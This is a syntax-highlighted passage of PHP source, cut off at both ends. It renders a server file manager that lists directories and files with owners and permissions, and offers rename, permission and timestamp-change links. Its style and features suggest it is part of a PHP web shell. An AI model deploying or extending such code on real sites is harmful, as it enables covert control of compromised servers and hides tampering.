<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdata</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span> = <span style="color: #eaeaea; background-color: #000000;">GetWFileList(</span>$<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">findstr</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdata</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span> = <span style="color: #eaeaea; background-color: #000000;">GetSFileList(</span>$<span style="color: #e7c547;">nowpath</span>, $<span style="color: #e7c547;">findstr</span>, $<span style="color: #e7c547;">re</span>);
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#30446;&#24405;&#21015;&#34920;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">scandir()&#25928;&#29575;&#26356;&#39640;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirs</span>=@<span style="color: #eaeaea; background-color: #000000;">opendir(</span>$<span style="color: #e7c547;">dir</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span> ($<span style="color: #e7c547;">file</span>=@<span style="color: #eaeaea; background-color: #000000;">readdir(</span>$<span style="color: #e7c547;">dirs</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filepath</span>=$<span style="color: #e7c547;">nowpath</span><span style="color: #d54e53; font-weight: bold;">.</span>$<span style="color: #e7c547;">file</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(@<span style="color: #eaeaea; background-color: #000000;">is_dir(</span>$<span style="color: #e7c547;">filepath</span>)){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'filename'</span>]=$<span style="color: #e7c547;">file</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'mtime'</span>]=<span style="color: #b9ca4a;">@date</span>(<span style="color: #70c0b1;">'Y-m-d H:i:s'</span>,<span style="color: #eaeaea; background-color: #000000;">filemtime(</span>$<span style="color: #e7c547;">filepath</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'dirchmod'</span>]=<span style="color: #eaeaea; background-color: #000000;">getChmod(</span>$<span style="color: #e7c547;">filepath</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'dirperm'</span>]=<span style="color: #eaeaea; background-color: #000000;">getPerms(</span>$<span style="color: #e7c547;">filepath</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'fileowner'</span>]=<span style="color: #eaeaea; background-color: #000000;">getUser(</span>$<span style="color: #e7c547;">filepath</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'dirlink'</span>]=$<span style="color: #e7c547;">nowpath</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'server_link'</span>]=$<span style="color: #e7c547;">filepath</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdata</span>[]=$<span style="color: #e7c547;">dirdb</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {<span style="color: #d54e53; background-color: #424242;">        </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'filename'</span>]=$<span style="color: #e7c547;">file</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'size'</span>]=<span style="color: #eaeaea; background-color: #000000;">sizecount(</span>@<span style="color: #eaeaea; background-color: #000000;">filesize(</span>$<span style="color: #e7c547;">filepath</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'mtime'</span>]=<span style="color: #b9ca4a;">@date</span>(<span style="color: #70c0b1;">'Y-m-d H:i:s'</span>,<span style="color: #eaeaea; background-color: #000000;">filemtime(</span>$<span style="color: #e7c547;">filepath</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'filechmod'</span>]=<span style="color: #eaeaea; background-color: #000000;">getChmod(</span>$<span style="color: #e7c547;">filepath</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'fileperm'</span>]=<span style="color: #eaeaea; background-color: #000000;">getPerms(</span>$<span style="color: #e7c547;">filepath</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'fileowner'</span>]=<span style="color: #eaeaea; background-color: #000000;">getUser(</span>$<span style="color: #e7c547;">filepath</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'dirlink'</span>]=$<span style="color: #e7c547;">nowpath</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'server_link'</span>]=$<span style="color: #e7c547;">filepath</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[]=$<span style="color: #e7c547;">filedb</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">while</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">unset(</span>$<span style="color: #e7c547;">dirdb</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">unset(</span>$<span style="color: #e7c547;">filedb</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">closedir(</span>$<span style="color: #e7c547;">dirs</span>);
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">sort(</span>$<span style="color: #e7c547;">dirdata</span>);
<span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">sort(</span>$<span style="color: #e7c547;">filedata</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dir_i</span> = <span style="color: #70c0b1;">'0'</span>;

<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;form id="filelist" name="filelist" action="'</span>.$<span style="color: #e7c547;">self</span>.<span style="color: #70c0b1;">'" method="post"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'file'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'thefile'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'doing'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dir'</span>,$<span style="color: #e7c547;">nowpath</span>);

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">dirdata</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">key</span> =&gt; $<span style="color: #e7c547;">dirdb</span>){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'filename'</span>]!=<span style="color: #70c0b1;">'..'</span> &amp;&amp; $<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'filename'</span>]!=<span style="color: #70c0b1;">'.'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">getdir</span> &amp;&amp; $<span style="color: #e7c547;">getdir</span> == $<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'server_link'</span>]) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">attachsize</span> = <span style="color: #eaeaea; background-color: #000000;">dirsize(</span>$<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'server_link'</span>]);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">attachsize</span> = <span style="color: #eaeaea; background-color: #000000;">is_numeric(</span>$<span style="color: #e7c547;">attachsize</span>) ? <span style="color: #eaeaea; background-color: #000000;">sizecount(</span>$<span style="color: #e7c547;">attachsize</span>) :<span style="text-decoration: underline;"> </span><span style="color: #70c0b1; text-decoration: underline;">'Unknown'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">attachsize</span> = <span style="color: #70c0b1;">'&lt;a href="javascript:getsize(\''</span>.$<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'server_li</span><span style="color: #70c0b1; text-decoration: underline;">nk'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\');"&gt;Stat&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">thisbg</span> = <span style="color: #eaeaea; background-color: #000000;">bg(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="'</span>.$<span style="color: #e7c547;">thisbg</span>.<span style="color: #70c0b1;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #70c0b1; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;&lt;a href="javascript:godir(\''</span>.$<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'server_link'</span>].<span style="color: #70c0b1;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'ser</span><span style="color: #70c0b1; text-decoration: underline;">ver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td nowrap&gt;'</span>.$<span style="color: #e7c547;">attachsize</span>.<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'server_link'</span>].<span style="color: #70c0b1;">'\');"&gt;'</span>.$<span style="color: #e7c547; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'dirchmod'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'server_link'</span>].<span style="color: #70c0b1;">'\');"&gt;'</span>.$<span style="color: #e7c547; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'dirperm'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td nowrap&gt;&lt;a href="javascript:rename(\''</span>.$<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'server_link'</span>].<span style="color: #70c0b1;">'</span><span style="color: #70c0b1; text-decoration: underline;">\');"&gt;Rename&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dir_i</span>++;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">dirdb</span>[<span style="color: #70c0b1;">'filename'</span>]==<span style="color: #70c0b1;">'..'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class='</span>.<span style="color: #eaeaea; background-color: #000000;">bg(</span>).<span style="color: #70c0b1;">'&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="java</span><span style="color: #70c0b1; text-decoration: underline;">script:godir(\''</span><span style="text-decoration: underline;">.</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">getUpPath(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px </span><span style="color: #70c0b1; text-decoration: underline;">solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">file_i</span> = <span style="color: #70c0b1;">'0'</span>;

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">filedata</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">key</span> =&gt; $<span style="color: #e7c547;">filedb</span>){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'filename'</span>]!=<span style="color: #70c0b1;">'..'</span> &amp;&amp; $<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'filename'</span>]!=<span style="color: #70c0b1;">'.'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fileurl</span> = <span style="color: #eaeaea; background-color: #000000;">str_replace(</span>$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">"DOCUMENT_ROOT"</span>],<span style="color: #70c0b1;">''</span>,$<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'server_</span><span style="color: #70c0b1; text-decoration: underline;">link'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">thisbg</span> = <span style="color: #eaeaea; background-color: #000000;">bg(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="'</span>.$<span style="color: #e7c547;">thisbg</span>.<span style="color: #70c0b1;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #70c0b1; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.((<span style="color: #eaeaea; background-color: #000000;">strpos(</span>$<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'server_link'</span>], $<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">"DOCUMENT_ROOT"</span>])<span style="text-decoration: underline;"> !== </span><span style="color: #7aa6da; text-decoration: underline;">false</span><span style="text-decoration: underline;">) ? </span><span style="color: #70c0b1; text-decoration: underline;">'&lt;a href="'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">fileurl</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'" target="_blank"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;"> : $</span><span style="color: #e7c547; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">]).</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'se</span><span style="color: #70c0b1; text-decoration: underline;">rver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td nowrap&gt;'</span>.$<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'size'</span>].<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'server_link'</span>].<span style="color: #70c0b1;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'filechmod'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'server_link'</span>].<span style="color: #70c0b1;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'fileperm'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
